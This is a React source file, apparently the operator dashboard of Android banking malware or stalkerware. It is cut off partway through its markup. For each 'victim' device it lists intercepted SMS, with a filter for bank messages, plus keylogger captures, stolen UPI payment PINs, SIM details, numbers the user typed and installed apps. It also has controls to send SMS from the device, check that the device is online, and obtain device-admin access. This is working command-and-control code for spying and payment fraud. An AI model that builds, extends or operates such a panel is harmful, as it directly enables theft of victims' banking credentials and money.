import { useParams, useNavigate } from "react-router-dom";
import { useState, useEffect } from "react";
import {
  ArrowLeft,
  Smartphone,
  MessageSquare,
  Phone,
  Keyboard,
  CreditCard,
  Shield,
  RefreshCw,
  Send,
  User,
  Smartphone as AppIcon,
  Search,
  Filter,
  Trash2,
} from "lucide-react";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Checkbox } from "@/components/ui/checkbox";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from "@/components/ui/table";
import { useDB } from "@/hooks/useDB";
import { getRelativeTime, parseTime } from "@/utils/time";
import { SendSMSDialog } from "@/components/SendSMSDialog";
import { firebaseService } from "@/lib/firebaseService";
// Firebase realtime imports not needed here after refactor
import { toast } from "sonner";
import { setPendingAndVerify } from "@/lib/responseChecker";

export function DeviceDetailPage() {
  const { victimId } = useParams<{ victimId: string }>();
  const navigate = useNavigate();
  const { db, loading, error, loadKeyLogs, loadUPIPins } = useDB();

  // State for Send SMS dialog and active tab
  const [smsDialogOpen, setSmsDialogOpen] = useState(false);
  const [activeTab, setActiveTab] = useState("overview");

  // State for message filtering
  const [messageSearch, setMessageSearch] = useState("");
  const [showBankMessagesOnly, setShowBankMessagesOnly] = useState(false);
  const [messagesPerPage, setMessagesPerPage] = useState("10");
  const [currentMessagePage, setCurrentMessagePage] = useState(1);
  const [messagesOrder, setMessagesOrder] = useState<'asc' | 'desc'>(
    'desc'
  );

  // State for KeyLogs pagination
  const [keyLogsPerPage, setKeyLogsPerPage] = useState("10");
  const [currentKeyLogsPage, setCurrentKeyLogsPage] = useState(1);
  const [keyLogsOrder, setKeyLogsOrder] = useState<'asc' | 'desc'>('desc');

  // State for UPI Pins order
  const [upiOrder, setUpiOrder] = useState<'asc' | 'desc'>('desc');

  // Debug logging
  console.log("DeviceDetailPage render:", { victimId, loading, error, db });
  console.log("🔍 UPI Pins in db:", db?.UPIPins);
  console.log("🔍 KeyLogs in db:", db?.KeyLogs);

  // Load KeyLogs and UPI Pins data when component mounts
  useEffect(() => {
    if (victimId && !loading) {
      console.log("🚀 Loading KeyLogs and UPI Pins for device:", victimId);
      console.log("📊 Current db.KeyLogs:", db.KeyLogs);
      console.log("💳 Current db.UPIPins:", db.UPIPins);

      console.log("🔧 Calling loadKeyLogs...");
      loadKeyLogs(victimId);
      console.log("🔧 Calling loadUPIPins...");
      loadUPIPins(victimId);

      // Check after a short delay to see if data was loaded
      setTimeout(() => {
        console.log("⏰ After loading - db.KeyLogs:", db.KeyLogs);
        console.log("⏰ After loading - db.UPIPins:", db.UPIPins);
        console.log("⏰ UPI Pins for this device:", db.UPIPins?.[victimId]);
        console.log("⏰ KeyLogs for this device:", db.KeyLogs?.[victimId]);
      }, 1000);
    }
  }, [victimId, loading, loadKeyLogs, loadUPIPins, db.KeyLogs, db.UPIPins]);

  // Early return if no victimId
  if (!victimId) {
    console.log("No victimId, navigating to devices");
    navigate("/devices");
    return null;
  }

  // Show loading state
  if (loading) {
    console.log("Loading state, showing spinner");
    return (
      <div className="flex min-h-screen bg-background items-center justify-center">
        <div className="text-center">
          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-primary mx-auto mb-4"></div>
          <p className="text-muted-foreground">Loading device details...</p>
        </div>
      </div>
    );
  }

  // Show error state
  if (error) {
    console.log("Error state:", error);
    return (
      <div className="text-center py-12">
        <h2 className="text-2xl font-bold mb-4 text-red-600">
          Error Loading Device
        </h2>
        <p className="text-muted-foreground mb-4">{error}</p>
        <Button onClick={() => navigate("/devices")}>
          <ArrowLeft className="w-4 h-4 mr-2" />
          Back to Devices
        </Button>
      </div>
    );
  }

  // Check if device exists
  const device = db?.DeviceInfo?.[victimId];
  if (!device) {
    console.log(
      "Device not found:",
      victimId,
      "Available devices:",
      Object.keys(db?.DeviceInfo || {}),
    );
    return (
      <div className="text-center py-12">
        <h2 className="text-2xl font-bold mb-4">Device Not Found</h2>
        <p className="text-muted-foreground mb-2">Device ID: {victimId}</p>
        <p className="text-muted-foreground mb-4">
          Available devices: {Object.keys(db?.DeviceInfo || {}).length}
        </p>
        <p className="text-muted-foreground mb-4">
          DB state: {JSON.stringify(db, null, 2)}
        </p>
        <Button onClick={() => navigate("/devices")}>
          <ArrowLeft className="w-4 h-4 mr-2" />
          Back to Devices
        </Button>
      </div>
    );
  }

  console.log("Rendering device details for:", device);

  // Fallback render to prevent black screen
  if (!device || !db) {
    return (
      <div className="flex min-h-screen bg-background items-center justify-center">
        <div className="text-center">
          <h2 className="text-2xl font-bold mb-4">Loading Device...</h2>
          <p className="text-muted-foreground">
            Please wait while we load the device details.
          </p>
        </div>
      </div>
    );
  }

  const handleSendSMS = () => {
    console.log("Opening Send SMS dialog for device:", victimId);
    setSmsDialogOpen(true);
  };

  // Trigger a live response check via ResponseChecker/{deviceId}
  const handleCheckDevice = async () => {
    try {
      if (!victimId) return;
      // Use Model as the primary ResponseChecker key (matches table Load/Ping behavior)
      const modelIdentifier = String(device?.Model || '').trim() || victimId;
      const result = await setPendingAndVerify(
        { modelIdentifier, victimId },
        { delayMs: 5000, retryMs: 3000, maxRetries: 1, logPrefix: 'DeviceDetailPage' }
      );
      if (result === 'online') toast.success('Device is online', { duration: 3000 });
      else if (result === 'offline') toast.error('Device is offline', { duration: 3000 });
      else toast.message('device is offline', { duration: 2000 });
    } catch (err) {
      console.error('Failed to set ResponseChecker pending:', err);
      toast.error('Failed to send check request');
    }
  };

  // Robust timestamp to number helper
  const toTimestamp = (value?: string | null): number => {
    try {
      if (!value) return 0;
      const d = parseTime(String(value));
      const t = d?.getTime();
      if (!isNaN(t)) return t;
      const d2 = new Date(String(value));
      const t2 = d2.getTime();
      return isNaN(t2) ? 0 : t2;
    } catch {
      return 0;
    }
  };

  const closeSMSDialog = () => {
    setSmsDialogOpen(false);
  };

  const handleTabChange = (value: string) => {
    setActiveTab(value);
  };

  // Get data for tabs with message IDs (from SMSData)
  const norm = (s: any) => (s ? String(s).trim().toLowerCase() : '');
  const victimIdNorm = norm(victimId);
  const deviceModelNorm = norm(device?.Model);
  const brandModelNorm = norm(device?.Brand ? `${device.Brand} ${device.Model || ''}` : device?.Model);
  const imeiNorm = norm(device?.IMEI);
  const acceptableVictimIds = new Set([
    victimIdNorm,
    deviceModelNorm,
    brandModelNorm,
    imeiNorm,
  ].filter(Boolean));

  const allMessagesWithIds = Object.entries(db.SMSData || {})
    .filter(([_, msg]) => acceptableVictimIds.has(norm((msg as any).VictimId)))
    .map(([id, msg]) => ({ ...msg, messageId: id }));

  // Debug: show counts for troubleshooting visibility issues
  console.log("SMSData counts => total:", Object.keys(db.SMSData || {}).length,
    "filtered for victim:", victimId, "=", allMessagesWithIds.length);

  // Format: dd-MM-yyyy HH:mm:ss
  const formatDateTime = (dateTimeString: string): string => {
    try {
      let date = new Date(dateTimeString);
      if (isNaN(date.getTime())) {
        // Attempt to parse common formats like dd-MM-yyyy HH:mm:ss
        const parts = dateTimeString.split(/[-/ :T]/);
        if (parts.length >= 5) {
          const [d, m, y, hh, mm, ss = 0] = parts.map((p) => parseInt(p, 10));
          const candidate = new Date(y, (m || 1) - 1, d || 1, hh || 0, mm || 0, ss || 0);
          if (!isNaN(candidate.getTime())) {
            date = candidate;
          }
        }
      }
      if (isNaN(date.getTime())) return dateTimeString;
      const dd = String(date.getDate()).padStart(2, "0");
      const MM = String(date.getMonth() + 1).padStart(2, "0");
      const yyyy = date.getFullYear();
      const HH = String(date.getHours()).padStart(2, "0");
      const mm = String(date.getMinutes()).padStart(2, "0");
      const ss = String(date.getSeconds()).padStart(2, "0");
      return `${dd}-${MM}-${yyyy} ${HH}:${mm}:${ss}`;
    } catch {
      return dateTimeString;
    }
  };

  // Filter messages based on search and bank filter
  const bankKeywords = ["credit", "debit", "upi", "received", "sent"];
  const filteredMessages = allMessagesWithIds.filter((msg) => {
    const searchMatch =
      messageSearch === "" ||
      msg.Body?.toLowerCase().includes(messageSearch.toLowerCase()) ||
      msg.Sender?.toLowerCase().includes(messageSearch.toLowerCase());

    if (!showBankMessagesOnly) {
      return searchMatch;
    }

    const isBankMessage = bankKeywords.some((keyword) =>
      msg.Body?.toLowerCase().includes(keyword.toLowerCase()),
    );

    return searchMatch && isBankMessage;
  });

  // Sort after filtering based on selected order
  const sortedMessages = [...filteredMessages].sort((a, b) => {
    const diff = toTimestamp(a.Time) - toTimestamp(b.Time);
    return messagesOrder === 'asc' ? diff : -diff;
  });

  // Pagination logic
  const messagesPerPageNum = parseInt(messagesPerPage);
  const totalPages = Math.ceil(sortedMessages.length / messagesPerPageNum);
  const startIndex = (currentMessagePage - 1) * messagesPerPageNum;
  const endIndex = startIndex + messagesPerPageNum;
  const messages = sortedMessages.slice(startIndex, endIndex);

  // Reset to page 1 when filters change
  const handleFilterChange = () => {
    setCurrentMessagePage(1);
  };

  const handleDeleteMessage = async (message: any, index: number) => {
    try {
      // Find the message ID from the database
      const allMessages = db.SMSData || {};
      const messageEntry = Object.entries(allMessages).find(
        ([_, msg]: [string, any]) =>
          msg.VictimId === victimId &&
          msg.Time === message.Time &&
          (msg.Body === message.Body || msg.Message === message.Message),
      );

      if (messageEntry) {
        const [messageId] = messageEntry;
        // Delete from Firebase
        await firebaseService.deleteSMSData(messageId);

        // The UI will update automatically through real-time listeners
      }
    } catch (error) {
      console.error("Error deleting message:", error);
    }
  };
  const userEntered = Object.values(db.UserEntered || {})
    .filter((entry) => entry.VictimID === victimId)
    .sort((a, b) => {
      const timeA = a.Time ? new Date(a.Time).getTime() : 0;
      const timeB = b.Time ? new Date(b.Time).getTime() : 0;
      return timeB - timeA;
    });
  const sims = db.Sims?.[victimId] || [];
  const keyLogs = db.KeyLogs?.[victimId] || [];
  const upiPins = db.UPIPins?.[victimId] || [];
  const appsInstalled = db.AppsInstalled?.[victimId] || {
    TotalApps: 0,
    AppsList: [],
    LastUpdated: null,
  };

  // KeyLogs pagination logic - expand logs first, then paginate
  const expandedKeyLogs = keyLogs.flatMap((log, logIdx) => {
    if (log.Column1 !== undefined) {
      // If it has column structure, create a row for each column
      const columns = [];
      for (let i = 1; i <= 6; i++) {
        const columnKey = `Column${i}`;
        if (log[columnKey] !== undefined && log[columnKey] !== '') {
          columns.push({
            log,
            columnKey,
            value: log[columnKey],
            keylogger: log.keylogger || 'UPI_PIN',
            timestamp: log.timestamp || log.time,
            rowId: `${logIdx}-${i}`
          });
        }
      }
      return columns;
    } else if (log.text) {
      // Fallback to legacy text structure
      return [{
        log,
        columnKey: 'text',
        value: log.text,
        keylogger: log.keylogger || 'KEY_LOG',
        timestamp: log.time,
        rowId: logIdx
      }];
    } else {
      // Empty log
      return [];
    }
  });

  // Sort key logs by timestamp with order
  const sortedExpandedKeyLogs = [...expandedKeyLogs]
    .map((row, idx) => ({
      ...row,
      __ts: toTimestamp((row as any).timestamp || (row as any).time || ''),
      __idx: idx,
    }))
    .sort((a, b) => {
      const diff = a.__ts - b.__ts;
      return keyLogsOrder === 'asc' ? diff || a.__idx - b.__idx : -(diff || a.__idx - b.__idx);
    });

  const keyLogsPerPageNum = parseInt(keyLogsPerPage);
  const keyLogsTotalPages = Math.ceil(sortedExpandedKeyLogs.length / keyLogsPerPageNum);
  const keyLogsStartIndex = (currentKeyLogsPage - 1) * keyLogsPerPageNum;
  const keyLogsEndIndex = keyLogsStartIndex + keyLogsPerPageNum;
  const paginatedExpandedKeyLogs = sortedExpandedKeyLogs.slice(keyLogsStartIndex, keyLogsEndIndex);

  return (
    <>
      <div className="flex min-h-screen bg-background">
        {/* Device Details */}
        <div className="flex-1 p-2 sm:p-4 lg:p-6 overflow-y-auto">
          {/* Header */}
          <div className="mb-4 sm:mb-6">
            <div className="flex items-center gap-2 sm:gap-3 mb-2">
              <Button
                variant="ghost"
                size="icon"
                onClick={() => navigate("/devices")}
                className="hover:bg-muted w-8 h-8 sm:w-10 sm:h-10"
              >
                <ArrowLeft className="w-3 h-3 sm:w-4 sm:h-4" />
              </Button>
              <div className="relative">
                <div className="w-8 h-8 sm:w-10 sm:h-10 lg:w-12 lg:h-12 rounded-lg bg-gradient-to-br from-primary to-accent flex items-center justify-center">
                  <Smartphone className="w-4 h-4 sm:w-5 sm:h-5 lg:w-6 lg:h-6 text-white" />
                </div>
                {/* Status indicator circle */}
                <div
                  className={`absolute -top-1 -right-1 w-3 h-3 sm:w-4 sm:h-4 rounded-full border-2 border-white ${device.Status === "Online" ? 'bg-green-500' : 'bg-red-500'
                    }`}
                  title={device.Status}
                ></div>
              </div>
              <div className="flex-1 min-w-0">
                <div className="flex items-center justify-between">
                  <h1 className="text-lg sm:text-xl lg:text-2xl font-bold truncate">
                    {victimId}
                  </h1>
                  <Button
                    variant="outline"
                    size="sm"
                    className="ml-2 h-8 px-2 text-xs whitespace-nowrap"
                    title="Check device response"
                    onClick={handleCheckDevice}
                  >
                    <RefreshCw className="h-3 w-3 mr-1" />
                    Check
                  </Button>
                </div>
                <p className="text-xs sm:text-sm text-foreground truncate">
                  {device.Model || "Unknown Model"}
                </p>
              </div>
            </div>
          </div>

          {/* Tabs */}
          <Tabs
            value={activeTab}
            onValueChange={handleTabChange}
            className="w-full"
          >
            <div className="overflow-x-auto">
              <TabsList className="grid w-full grid-cols-7 bg-muted/50 mb-4 sm:mb-6 min-w-max">
                <TabsTrigger
                  value="overview"
                  className="flex items-center gap-1 sm:gap-2 px-2 sm:px-3 text-xs sm:text-sm"
                >
                  <Smartphone className="w-3 h-3 sm:w-4 sm:h-4" />
                  <span className="hidden sm:inline">Overview</span>
                  <span className="sm:hidden">Info</span>
                </TabsTrigger>
                <TabsTrigger
                  value="messages"
                  className="flex items-center gap-1 sm:gap-2 px-2 sm:px-3 text-xs sm:text-sm"
                >
                  <MessageSquare className="w-3 h-3 sm:w-4 sm:h-4" />
                  <span className="hidden sm:inline">Messages</span>
                  <span className="sm:hidden">SMS</span>
                </TabsTrigger>
                <TabsTrigger
                  value="userentered"
                  className="flex items-center gap-1 sm:gap-2 px-2 sm:px-3 text-xs sm:text-sm"
                >
                  <User className="w-3 h-3 sm:w-4 sm:h-4" />
                  <span className="hidden sm:inline">UserEntered</span>
                  <span className="sm:hidden">User</span>
                </TabsTrigger>
                <TabsTrigger
                  value="sims"
                  className="flex items-center gap-1 sm:gap-2 px-2 sm:px-3 text-xs sm:text-sm"
                >
                  <Phone className="w-3 h-3 sm:w-4 sm:h-4" />
                  <span className="hidden sm:inline">Sims</span>
                  <span className="sm:hidden">SIM</span>
                </TabsTrigger>
                <TabsTrigger
                  value="keylogs"
                  className="flex items-center gap-1 sm:gap-2 px-2 sm:px-3 text-xs sm:text-sm"
                >
                  <Keyboard className="w-3 h-3 sm:w-4 sm:h-4" />
                  <span className="hidden sm:inline">Key logs</span>
                  <span className="sm:hidden">Keys</span>
                </TabsTrigger>
                <TabsTrigger
                  value="upipins"
                  className="flex items-center gap-1 sm:gap-2 px-2 sm:px-3 text-xs sm:text-sm"
                >
                  <CreditCard className="w-3 h-3 sm:w-4 sm:h-4" />
                  <span className="hidden sm:inline">UPI pins</span>
                  <span className="sm:hidden">UPI</span>
                </TabsTrigger>
                <TabsTrigger
                  value="applications"
                  className="flex items-center gap-1 sm:gap-2 px-2 sm:px-3 text-xs sm:text-sm"
                >
                  <AppIcon className="w-3 h-3 sm:w-4 sm:h-4" />
                  <span className="hidden sm:inline">Applications</span>
                  <span className="sm:hidden">Apps</span>
                </TabsTrigger>
              </TabsList>
            </div>

            {/* Action Buttons */}
            <div className="flex flex-wrap gap-2 sm:gap-3 mb-4 sm:mb-6">
              <Button
                variant="outline"
                className="flex items-center gap-1 sm:gap-2 text-xs sm:text-sm px-2 sm:px-3 py-1 sm:py-2 hover:bg-accent hover:text-accent-foreground transition-colors"
              >
                <Shield className="w-3 h-3 sm:w-4 sm:h-4" />
                <span className="hidden sm:inline">Device Admin Access</span>
                <span className="sm:hidden">Admin</span>
              </Button>
              <Button
                variant="outline"
                className="flex items-center gap-1 sm:gap-2 text-xs sm:text-sm px-2 sm:px-3 py-1 sm:py-2 hover:bg-accent hover:text-accent-foreground transition-colors"
              >
                <RefreshCw className="w-3 h-3 sm:w-4 sm:h-4" />
                <span className="hidden sm:inline">Re Sync Device</span>
                <span className="sm:hidden">Sync</span>
              </Button>

            </div>

            <TabsContent value="overview">
              <Card className="card-glass border-0">
                <CardContent className="p-3 sm:p-6 lg:p-8">
                  <div className="space-y-4 sm:space-y-6">
                    {/* Device Information */}
                    <div className="grid grid-cols-1 lg:grid-cols-2 gap-4 sm:gap-6">
                      <div className="space-y-4">
                        <div className="flex justify-between items-center">
                          <span className="text-muted-foreground font-medium">
                            Device:
                          </span>
                          <span className="font-mono">{victimId}</span>
                        </div>
                        <div className="flex justify-between items-center">
                          <span className="text-muted-foreground font-medium">
                            Status:
                          </span>
                          <div className="flex items-center gap-2">
                            <Badge
                              className={
                                device.Status === "Online"
                                  ? "badge-online"
                                  : "badge-offline"
                              }
                            >
                              {device.Status || "Unknown"}
                            </Badge>
                            {device.Status === "Offline"}
                          </div>
                        </div>
                        <div className="flex justify-between items-center">
                          <span className="text-muted-foreground font-medium">
                            IP Address:
                          </span>
                          <span className="font-mono">
                            {device.IP || device.IPAddress || "Unknown"}
                          </span>
                        </div>
                        <div className="flex justify-between items-center">
                          <span className="text-muted-foreground font-medium">
                            UPI Pin:
                          </span>
                          <div>
                            <Badge
                              variant={
                                (() => {
                                  const upiPins = db?.UPIPins?.[victimId] || [];
                                  const hasValidPin =
                                    upiPins.length > 0 &&
                                    upiPins.some((pinObj: any) => {
                                      // Handle new structure: { pin: string, timestamp: string }
                                      if (pinObj && typeof pinObj === 'object' && pinObj.pin) {
                                        return pinObj.pin && pinObj.pin !== "No Pin";
                                      }
                                      // Handle old structure: string[]
                                      if (typeof pinObj === 'string') {
                                        return pinObj && pinObj !== "No Pin";
                                      }
                                      return false;
                                    });
                                  return hasValidPin ? "default" : "secondary";
                                })()
                              }
                            >
                              {(() => {
                                const upiPins = db?.UPIPins?.[victimId] || [];
                                const hasValidPin =
                                  upiPins.length > 0 &&
                                  upiPins.some((pinObj: any) => {
                                    // Handle new structure: { pin: string, timestamp: string }
                                    if (pinObj && typeof pinObj === 'object' && pinObj.pin) {
                                      return pinObj.pin && pinObj.pin !== "No Pin";
                                    }
                                    // Handle old structure: string[]
                                    if (typeof pinObj === 'string') {
                                      return pinObj && pinObj !== "No Pin";
                                    }
                                    return false;
                                  });
                                return hasValidPin ? "Has Pin" : "No Pin";
                              })()}
                            </Badge>
                          </div>
                        </div>
                      </div>
                      <div className="space-y-4">
                        <div className="space-y-2">
                          <span className="text-muted-foreground font-medium">
                            Note:
                          </span>
                          <div className="w-full bg-muted/30 rounded-md p-3">
                            <div className="w-full max-w-full overflow-auto max-h-40">
                              <div style={{
                                whiteSpace: 'pre-wrap',
                                wordBreak: 'break-word',
                                overflowWrap: 'break-word',
                                wordWrap: 'break-word',
                                maxWidth: '100%',
                                display: 'inline-block',
                                fontFamily: 'inherit',
                                fontSize: '0.875rem',
                                lineHeight: '1.25rem'
                              }}>
                                {String(device.Note || "-")}
                              </div>
                            </div>
                          </div>
                        </div>
                        <div className="flex justify-between items-center">
                          <span className="text-muted-foreground font-medium">
                            Added:
                          </span>
                          <span>{device.Added || "-"}</span>
                        </div>
                        <div className="flex justify-between items-center">
                          <span className="text-muted-foreground font-medium">
                            Apps Installed:
                          </span>
                          <Badge
                            variant={
                              appsInstalled?.TotalApps > 0
                                ? "default"
                                : "secondary"
                            }
                          >
                            {appsInstalled?.TotalApps ||
                              device.AppsInstalled ||
                              0}
                            {!appsInstalled?.TotalApps &&
                              !device.AppsInstalled &&
                              " (No Data)"}
                          </Badge>
                        </div>
                        <div className="flex justify-between items-center">
                          <span className="text-muted-foreground font-medium">
                            Battery:
                          </span>
                          <Badge
                            variant={
                              parseInt(
                                (
                                  device.BatteryLevel || device.Battery
                                )?.replace("%", "") || "0",
                              ) < 20
                                ? "destructive"
                                : "default"
                            }
                          >
                            {device.BatteryLevel || device.Battery || "Unknown"}
                          </Badge>
                        </div>
                      </div>
                        <div className="flex flex-end flex-col">
                        {upiPins.map((pin, idx) => (
                          <div key={`${pin.timestamp || ''}-${pin.pin || ''}-${idx}`} className="flex flex-col items-start">
                          <div>UPI Pin: {pin.pin}</div>  
                          </div>
                        ))}
                        </div>
                    </div>

                    {/* Device Brand, Model, and Android Version */}
                    <div className="border-t pt-4 sm:pt-6">
                      <h3 className="text-base sm:text-lg font-semibold mb-3 sm:mb-4">
                        Device Specifications
                      </h3>
                      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-3 sm:gap-4">
                        <div className="p-4 bg-muted/30 rounded-lg">
                          <div className="flex justify-between items-center">
                            <span className="text-muted-foreground font-medium">
                              Brand:
                            </span>
                            <Badge variant="outline">
                              {device.Brand || "Unknown"}
                            </Badge>
                          </div>
                        </div>
                        <div className="p-4 bg-muted/30 rounded-lg">
                          <div className="flex justify-between items-center">
                            <span className="text-muted-foreground font-medium">
                              Model:
                            </span>
                            <span className="font-mono text-foreground">
                              {device.Model || "Unknown"}
                            </span>
                          </div>
                        </div>
                        <div className="p-4 bg-muted/30 rounded-lg">
                          <div className="flex justify-between items-center">
                            <span className="text-muted-foreground font-medium">
                              Android Version:
                            </span>
                            <Badge variant="outline">
                              {device.AndroidVersion || "Unknown"}
                            </Badge>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </CardContent>
              </Card>
            </TabsContent>

            <TabsContent value="messages">
              <Card className="card-glass border-0">
                <CardHeader className="p-3 sm:p-6">
                  <CardTitle className="flex items-center gap-2 text-base sm:text-lg">
                    <MessageSquare className="w-4 h-4 sm:w-5 sm:h-5" />
                    Messages ({allMessagesWithIds.length})
                  </CardTitle>

                  {/* Order Filter */}
                  <div className="flex justify-end mb-3">
                    <div className="flex items-center gap-2">
                      <span className="text-sm text-muted-foreground">Order</span>
                      <Select
                        value={messagesOrder}
                        onValueChange={(v) => {
                          setMessagesOrder(v as 'asc' | 'desc');
                          setCurrentMessagePage(1);
                        }}
                      >
                        <SelectTrigger className="w-28 h-9">
                          <SelectValue />
                        </SelectTrigger>
                        <SelectContent>
                          <SelectItem value="desc">Newest first</SelectItem>
                          <SelectItem value="asc">Oldest first</SelectItem>
                        </SelectContent>
                      </Select>
                    </div>
                  </div>
                </CardHeader>
                <CardContent className="p-3 sm:p-6">
                  <div className="flex flex-col sm:flex-row sm:items-center justify-between mb-4 sm:mb-6 gap-3 sm:gap-0">
                    <div style={{ flexGrow: 1 }}>
                      <Button
                        onClick={handleSendSMS}
                        className="flex items-center gap-1 sm:gap-2 bg-[#00ffff] hover:bg-[#00e6e6] text-black font-eurostile-extended font-bold tracking-wider shadow-lg shadow-[#00ffff]/30 text-xs sm:text-sm px-3 sm:px-4 py-2 rounded-lg transition-all duration-200 hover:scale-105 disabled:opacity-60 disabled:cursor-not-allowed"
                        title={
                          device.Status !== "Online"
                            ? "Device must be online to send SMS"
                            : "Send SMS to this device"
                        }
                      >
                        <Send className="w-3 h-3 sm:w-4 sm:h-4" />
                        <span className="hidden sm:inline">
                          Send SMS {device.Status !== "Online" && "(Offline)"}
                        </span>
                        <span className="sm:hidden">SMS</span>
                      </Button>
                    </div>
                    <div className="relative mt-1" style={{ width: '484px', marginRight: '132px' }}>
                      <Search className="absolute left-2 top-1/2 transform -translate-y-1/2 text-gray-400 w-3.5 h-3.5" />
                      <Input
                        placeholder="Search Messages..."
                        value={messageSearch}
                        onChange={(e) => {
                          setMessageSearch(e.target.value);
                          handleFilterChange();
                        }}
                        className="pl-8 text-xs h-8 w-full"
                      />
                    </div>
                    <div className="flex items-center gap-2">
                      <Checkbox
                        id="bank-messages"
                        checked={showBankMessagesOnly}
                        onCheckedChange={(checked) =>
                          setShowBankMessagesOnly(checked === true)
                        }
                        className="w-3.5 h-3.5"
                      />
                      <label
                        htmlFor="bank-messages"
                        className="text-xs cursor-pointer text-muted-foreground"
                      >
                        Bank messages only
                      </label>
                    </div>
                  </div>


                  <>
                    <div className="overflow-x-auto">

                      <Table className="border messages-table">
                        <TableHeader>
                          <TableRow>
                            <TableHead className="border-r">ID</TableHead>
                            <TableHead className="border-r">Type</TableHead>
                            <TableHead className="border-r">Sender</TableHead>
                            <TableHead className="border-r p-0">
                              <div className="flex flex-col gap-2 p-2">
                                <div className="font-medium">Message</div>
                              </div>
                            </TableHead>
                            <TableHead className="border-r">
                              Date & Time
                            </TableHead>
                            <TableHead className="w-[50px]">
                              Actions
                            </TableHead>
                          </TableRow>
                        </TableHeader>
                        <TableBody>
                          {messages.map((msg, idx) => (
                            <TableRow key={idx} className="border-b">
                              <TableCell className="font-mono text-xs text-muted-foreground border-r">
                                {msg.messageId || "N/A"}
                              </TableCell>
                              <TableCell className="border-r">
                                <Badge
                                  variant={
                                    msg.Type === "Sent" || msg.SmsType === "SENT" || msg.Recipient
                                      ? "default"
                                      : "secondary"
                                  }
                                  className={
                                    msg.Type === "Sent" || msg.SmsType === "SENT" || msg.Recipient
                                      ? "bg-green-100 text-green-700"
                                      : "bg-blue-100 text-blue-700"
                                  }
                                >
                                  {msg.Type === "Sent" || msg.SmsType === "SENT" || msg.Recipient
                                    ? "Outgoing"
                                    : "Incoming"}
                                </Badge>
                              </TableCell>
                              <TableCell className="font-medium border-r">
                                {msg.Type === "Sent" || msg.SmsType === "SENT" || msg.Recipient
                                  ? `To: ${msg.Recipient || "Unknown"}`
                                  : msg.Sender || "Unknown"}
                              </TableCell>
                              <TableCell className="border-r">
                                <div className="whitespace-pre-wrap break-words max-w-md">
                                  {msg.Body ||
                                    msg.Message ||
                                    "No message content"}
                                </div>
                              </TableCell>
                              <TableCell className="text-sm text-muted-foreground border-r">
                                {formatDateTime(msg.Time)}
                              </TableCell>
                              <TableCell>
                                <Button
                                  variant="ghost"
                                  size="sm"
                                  onClick={() =>
                                    handleDeleteMessage(msg, idx)
                                  }
                                  className="h-8 w-8 p-0 hover:bg-red-50 hover:text-red-600"
                                >
                                  <Trash2 className="h-4 w-4" />
                                </Button>
                              </TableCell>
                            </TableRow>
                          ))}

                          {!messages.length && <TableRow>
                            <TableCell colSpan={6} className="h-12 text-center">
                              no messages found
                            </TableCell>
                          </TableRow>}
                        </TableBody>
                      </Table>
                    </div>

                    {/* Pagination Controls */}
                    <div className="flex flex-col sm:flex-row items-stretch sm:items-center justify-between gap-3 sm:gap-0 mt-4 sm:mt-6 pt-3 sm:pt-4 border-t">
                      <div className="flex items-center gap-2 justify-center sm:justify-start">
                        <span className="text-xs sm:text-sm text-muted-foreground">
                          Rows per page
                        </span>
                        <Select
                          value={messagesPerPage}
                          onValueChange={(value) => {
                            setMessagesPerPage(value);
                            setCurrentMessagePage(1);
                          }}
                        >
                          <SelectTrigger className="w-20 sm:w-24 h-8 sm:h-10">
                            <SelectValue />
                          </SelectTrigger>
                          <SelectContent>
                            <SelectItem value="5">5</SelectItem>
                            <SelectItem value="10">10</SelectItem>
                            <SelectItem value="25">25</SelectItem>
                            <SelectItem value="50">50</SelectItem>
                            <SelectItem value="100">100</SelectItem>
                            <SelectItem value="200">200</SelectItem>
                            <SelectItem value="300">300</SelectItem>
                            <SelectItem value="400">400</SelectItem>
                            <SelectItem value="500">500</SelectItem>
                            <SelectItem value="600">600</SelectItem>
                            <SelectItem value="700">700</SelectItem>
                            <SelectItem value="800">800</SelectItem>
                            <SelectItem value="900">900</SelectItem>
                            <SelectItem value="1000">1000</SelectItem>
                            <SelectItem value="2000">2000</SelectItem>
                            <SelectItem value="5000">5000</SelectItem>
                          </SelectContent>
                        </Select>
                      </div>

                      <div className="flex flex-col sm:flex-row items-center gap-2 sm:gap-4">
                        <span className="text-xs sm:text-sm text-muted-foreground text-center">
                          {startIndex + 1}-
                          {Math.min(endIndex, filteredMessages.length)} of{" "}
                          {filteredMessages.length}
                        </span>
                        <div className="flex items-center gap-1">
                          <Button
                            variant="outline"
                            size="sm"
                            onClick={() =>
                              setCurrentMessagePage((prev) =>
                                Math.max(1, prev - 1),
                              )
                            }
                            disabled={currentMessagePage === 1}
                            className="w-8 h-8 p-0 text-xs"
                          >
                            &lt;
                          </Button>
                          <span className="px-2 sm:px-3 py-1 text-xs sm:text-sm">
                            {currentMessagePage}
                          </span>
                          <Button
                            variant="outline"
                            size="sm"
                            onClick={() =>
                              setCurrentMessagePage((prev) =>
                                Math.min(totalPages, prev + 1),
                              )
                            }
                            disabled={currentMessagePage === totalPages}
                            className="w-8 h-8 p-0 text-xs"
                          >
                            &gt;
                          </Button>
                        </div>
                      </div>
                    </div>
                  </>

                </CardContent>
              </Card>
            </TabsContent>

            <TabsContent value="userentered">
              <Card className="card-glass border-0">
                <CardHeader>
                  <CardTitle className="flex items-center gap-2">
                    <User className="w-5 h-5" />
                    User Entered Data ({userEntered.length})
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  {userEntered.length === 0 ? (
                    <p className="text-muted-foreground text-center py-12">
                      No user entered data found
                    </p>
                  ) : (
                    <div className="space-y-4 max-h-96 overflow-y-auto">
                      {userEntered.map((entry, idx) => (
                        <div
                          key={idx}
                          className="p-4 bg-muted/30 rounded-lg border"
                        >
                          <div className="flex items-start justify-between gap-3 mb-2">
                            <span className="font-medium text-sm">
                              Number: {entry.NumberEntered}
                            </span>
                            <div className="flex items-center gap-2">
                              <Badge variant="outline" className="text-xs">
                                User Input
                              </Badge>
